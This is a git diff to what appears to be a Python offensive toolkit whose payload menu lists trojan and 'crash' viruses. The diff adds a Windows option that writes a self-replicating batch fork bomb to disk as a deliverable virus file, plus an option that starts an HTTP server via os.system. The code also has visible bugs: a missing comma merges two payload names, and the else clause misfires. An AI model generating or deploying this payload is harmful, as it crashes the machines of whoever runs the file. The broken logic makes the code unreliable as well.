@@ -51,13 +51,14 @@ jre: str = ""
 payload: list[str] = [
     'linux/amd64/trojan_virus',
     'linux/amd64/crash_virus',
-    'android/arch64/trojan_virus',
+    'windows/cmd/crash_virus',
     'program/python/trojan_virus',
     'program/java/trojan_virus',
     'web/attack/trojan_virus ',
     'web/attack/crash_virus',
     'post/proxy/server',
     'web/social/web_terminal'
+    'post/http/server'
 ]
 
 
@@ -108,6 +109,22 @@ def run_command(command: str) -> bool:
 
             if use_payload == 'linux/amd64/trojan_virus':
                 Linux_amd64_trojanVirus.console(runPath)
+
+            if use_payload == 'windows/cmd/crash_virus':
+                with open(os.environ['HOME']+"/window_cmd_crash_virus.bat","w") as f:
+                    f.write("""
+        :1
+        start %0
+        goto 1""")
+                f.close()
+                print(" [INFO] Virus file make in: "+os.environ['HOME']+"/window_cmd_crash_virus.bat")
+            
+            if use_payload == 'post/http/server':
+                try:
+                    port: int = int(input("Start Http Server Port: ").strip())
+                    os.system(jre+" -jar "+runPath+"/../HttpServer/release/HttpServer.jar "+str(port))
+                except:
+                    print("input error")
 
             else:
                 print("CAN NOT FIND TARGET MODULE: "+use_payload)
